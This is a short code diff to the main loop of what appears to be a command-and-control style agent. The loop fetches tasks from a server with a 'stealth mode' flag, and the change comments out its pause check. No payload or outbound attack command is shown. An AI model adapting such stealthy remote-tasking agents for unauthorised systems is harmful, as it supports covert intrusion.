@@ -532,11 +532,11 @@ def main():
     # Enter our main agent loop (original implementation)
     while True:
         # (Optional) check if agent should be in paused state
-        send_message("agent/get_pause", stealth_mode=STEALTH_MODE)
-        if status:
-            desired_pause_until = float(response)
-            if desired_pause_until > time.time():
-                time.sleep(desired_pause_until - time.time())
+        #send_message("agent/get_pause", stealth_mode=STEALTH_MODE)
+        #if status:
+            #desired_pause_until = float(response)
+            #if desired_pause_until > time.time():
+                #time.sleep(desired_pause_until - time.time())
 
         # Let's see if any tasks are waiting for this agent
         status, response = send_message("agent/get_task", stealth_mode=STEALTH_MODE)
